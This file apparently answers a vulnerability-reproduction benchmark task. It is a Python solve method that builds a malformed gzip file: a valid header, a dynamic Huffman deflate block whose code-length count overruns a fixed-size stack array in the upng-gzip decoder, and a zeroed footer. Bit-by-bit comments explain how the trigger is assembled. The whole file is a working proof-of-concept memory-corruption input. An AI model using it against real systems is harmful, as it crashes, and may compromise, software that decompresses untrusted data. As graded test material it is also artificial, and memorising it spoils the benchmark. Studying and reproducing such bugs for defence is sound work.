import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in upng-gzip.
        The vulnerability exists because the temporary array for code length alphabet is 
        sized to 15, but the format allows up to 19 code lengths.
        """
        
        # GZIP Header (10 bytes)
        # ID1 (1F), ID2 (8B), CM (08 = Deflate), FLG (00), MTIME (00000000), XFL (00), OS (03 = Unix)
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'
        
        # Deflate Block (9 bytes) to trigger the overflow
        # We construct a Dynamic Huffman block (BTYPE=2)
        # Parameters:
        #   BFINAL = 1
        #   BTYPE = 2 (Dynamic)
        #   HLIT = 0 (257 literal/length codes)
        #   HDIST = 0 (1 distance code)
        #   HCLEN = 12 (16 code lengths for the code length alphabet)
        # 
        # Construction logic (LSB first bit stream):
        # Byte 0: 
        #   Bits 0-2: 1 (BFINAL) + 10 (BTYPE 2 -> 0,1) -> 1,0,1 -> 5
        #   Bits 3-7: HLIT (00000)
        #   Value: 0x05
        #
        # Byte 1:
        #   Bits 0-4: HDIST (00000)
        #   Bits 5-7: HCLEN lower 3 bits. HCLEN=12 is 1100 binary. LSB first: 0,0,1,1.
        #             So bits 0,1,2 of HCLEN are 0,0,1.
        #   Value: 0 | (1 << 7) = 0x80
        #
        # Byte 2:
        #   Bit 0: HCLEN 4th bit (1)
        #   Bits 1-7: Code lengths (3 bits each). We supply 0s.
        #   Value: 0x01
        #
        # Bytes 3-8:
        #   Remaining bits for the 16 code lengths (16 * 3 = 48 bits total).
        #   We pad with 0x00.
        
        payload = b'\x05\x80\x01\x00\x00\x00\x00\x00\x00'
        
        # GZIP Footer (8 bytes)
        # CRC32 (4 bytes) + ISIZE (4 bytes)
        # Values don't matter as crash occurs during decompression
        footer = b'\x00' * 8
        
        return header + payload + footer
